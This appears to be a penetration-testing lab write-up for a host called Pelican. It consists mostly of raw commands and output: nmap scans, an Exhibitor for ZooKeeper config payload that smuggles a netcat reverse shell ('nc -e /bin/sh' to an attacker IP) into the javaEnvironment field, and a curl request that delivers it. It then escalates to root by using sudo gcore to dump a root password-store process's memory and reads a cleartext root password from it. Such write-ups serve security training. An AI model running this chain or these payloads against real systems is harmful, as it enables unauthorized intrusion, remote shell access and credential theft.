```sh
Nmap scan report for 192.168.142.98
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2026-01-09 14:02:54 CET for 0s
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 61
139/tcp  open  netbios-ssn     syn-ack ttl 61
445/tcp  open  microsoft-ds    syn-ack ttl 61
631/tcp  open  ipp             syn-ack ttl 61
2222/tcp open  EtherNetIP-1    syn-ack ttl 61
8080/tcp open  http-proxy      syn-ack ttl 61
8081/tcp open  blackice-icecap syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.056KB)
```
```sh
Nmap scan report for 192.168.142.98
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2026-01-09 14:03:11 CET for 35s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDssyyACw3AHaTatHhBU1VyBRbKOirrDG8M9IjpJPTf/v8mdIqiXk1HsBdoFZcsmWJVV4OXC7GMcHa+s0tZceTmgGf5TpiCB2yXUYPZre183LjJWM6KQMZVI0LHz9Yd3ji2bdD5jjtVxwnjrdx8GlU1THMGbzZivfSsPF18arMIq3ukYBS09Ov1SIKR4DJ7pjtBRutRBZKI/8/H+uB2u47AQRwbWuVaOmtZyDrfvgL/IqAFRQrbeP1VNQAErzHl8wNuk1vR+yROv0j7smTqoqqc8aB751O63gtBdCvKzpigwFDLyxYuzu8dW1Hh6ZQzaQZgWkw6SZeExAijK7yXSU61
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUPmkVV/Q+iD07j1sFmdFWp7yppofTTgfzAhvMkyGPulIdMDbzFgW/pRAq3R3zZV7aEcWAMfFHgdXfj3W4FUuc=
|   256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPO1eLYoJ0AhVJ5NIDfaSrfUis34Bw5bKMMdFWzHPx0
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         syn-ack ttl 61 CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2181/tcp  open  zookeeper   syn-ack ttl 61 Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDssyyACw3AHaTatHhBU1VyBRbKOirrDG8M9IjpJPTf/v8mdIqiXk1HsBdoFZcsmWJVV4OXC7GMcHa+s0tZceTmgGf5TpiCB2yXUYPZre183LjJWM6KQMZVI0LHz9Yd3ji2bdD5jjtVxwnjrdx8GlU1THMGbzZivfSsPF18arMIq3ukYBS09Ov1SIKR4DJ7pjtBRutRBZKI/8/H+uB2u47AQRwbWuVaOmtZyDrfvgL/IqAFRQrbeP1VNQAErzHl8wNuk1vR+yROv0j7smTqoqqc8aB751O63gtBdCvKzpigwFDLyxYuzu8dW1Hh6ZQzaQZgWkw6SZeExAijK7yXSU61
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUPmkVV/Q+iD07j1sFmdFWp7yppofTTgfzAhvMkyGPulIdMDbzFgW/pRAq3R3zZV7aEcWAMfFHgdXfj3W4FUuc=
|   256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPO1eLYoJ0AhVJ5NIDfaSrfUis34Bw5bKMMdFWzHPx0
8080/tcp  open  http        syn-ack ttl 61 Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        syn-ack ttl 61 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.142.98:8080/exhibitor/v1/ui/index.html
46295/tcp open  java-rmi    syn-ack ttl 61 Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58833/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41932/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56835/udp): CLEAN (Timeout)
|   Check 4 (port 54082/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-01-09T08:03:42-05:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-09T13:03:40
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
           Raw packets sent: 65545 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Found ZooKeeper v1.0 on port 8081:
![[Pasted image 20260109141110.png]]

Found exploit for Zookeeper:
https://www.exploit-db.com/exploits/51819

Found CVE for Exhibitor for ZooKeeper v1.0 
https://pentest-tools.com/vulnerabilities-exploits/exhibitor-109-171-rce-vulnerability_5035

data.json:
```json
cat data.json | jq                                                           
{
  "zookeeperInstallDirectory": "/opt/zookeeper",
  "zookeeperDataDirectory": "/opt/zookeeper/snapshots",
  "zookeeperLogDirectory": "/opt/zookeeper/transactions",
  "logIndexDirectory": "/opt/zookeeper/transactions",
  "autoManageInstancesSettlingPeriodMs": "0",
  "autoManageInstancesFixedEnsembleSize": "0",
  "autoManageInstancesApplyAllAtOnce": "1",
  "observerThreshold": "0",
  "serversSpec": "1:exhibitor-demo",
  "javaEnvironment": "$(/bin/nc -e /bin/sh 192.168.45.192 4444 &)",
  "log4jProperties": "",
  "clientPort": "2181",
  "connectPort": "2888",
  "electionPort": "3888",
  "checkMs": "30000",
  "cleanupPeriodMs": "300000",
  "cleanupMaxFiles": "20",
  "backupPeriodMs": "600000",
  "backupMaxStoreMs": "21600000",
  "autoManageInstances": "1",
  "zooCfgExtra": {
    "tickTime": "2000",
    "initLimit": "10",
    "syncLimit": "5",
    "quorumListenOnAllIPs": "true"
  },
  "backupExtra": {
    "directory": ""
  },
  "serverId": 1
}
```

```sh
rlwrap nc -lvnp 4444      
Listening on 0.0.0.0 4444
```

```sh
curl -X POST -d @data.json http://192.168.142.98:8080/exhibitor/v1/config/set
```

![[Pasted image 20260109143314.png]]

![[Pasted image 20260109143329.png]]

```sh
charles@pelican:~$ cat local.txt && date && ifconfig
cat local.txt && date && ifconfig
ffdcad1ad4f522dfe067fa082ca75705
Fri 09 Jan 2026 08:38:03 AM EST
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.142.98  netmask 255.255.255.0  broadcast 192.168.142.255
        ether 00:50:56:9e:77:cd  txqueuelen 1000  (Ethernet)
        RX packets 4208  bytes 452369 (441.7 KiB)
        RX errors 0  dropped 15  overruns 0  frame 0
        TX packets 3021  bytes 2307477 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 7533  bytes 462860 (452.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7533  bytes 462860 (452.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```sh
charles@pelican:~$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

https://gtfobins.github.io/gtfobins/gcore/#sudo

```sh
charles@pelican:~$ ps -ef --forest | grep -i password
ps -ef --forest | grep -i password
root       490     1  0 08:28 ?        00:00:00 /usr/bin/password-store
charles   7241  3328  0 08:49 pts/0    00:00:00          \_ grep -i password
```

```sh
charles@pelican:~$ sudo /usr/bin/gcore -o outfile 490
sudo /usr/bin/gcore -o outfile 490
0x00007fec7ea386f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffd84db2450, remaining=remaining@entry=0x7ffd84db2450) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile outfile.490
[Inferior 1 (process 490) detached]
```

```sh
charles@pelican:~$ strings outfile.490
strings outfile.490
CORE
password-store
/usr/bin/password-store 
CORE
CORE
/usr/bin/passwor
////////////////
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
;*3$"
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
001 Password: root:
ClogKingpinInning731
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
```

Found root password:
ClogKingpinInning731

```sh
charles@pelican:~$ su -
su -
Password: ClogKingpinInning731

root@pelican:~# 
```

ROOOT!!

```sh
root@pelican:~# cat proof.txt && date && ifconfig
cat proof.txt && date && ifconfig
7aa86fbbd43286ed1ac2803bf6ae0f95
Fri 09 Jan 2026 08:52:55 AM EST
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.142.98  netmask 255.255.255.0  broadcast 192.168.142.255
        ether 00:50:56:9e:77:cd  txqueuelen 1000  (Ethernet)
        RX packets 11585  bytes 1272122 (1.2 MiB)
        RX errors 0  dropped 137  overruns 0  frame 0
        TX packets 7813  bytes 4202990 (4.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20023  bytes 1223980 (1.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20023  bytes 1223980 (1.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
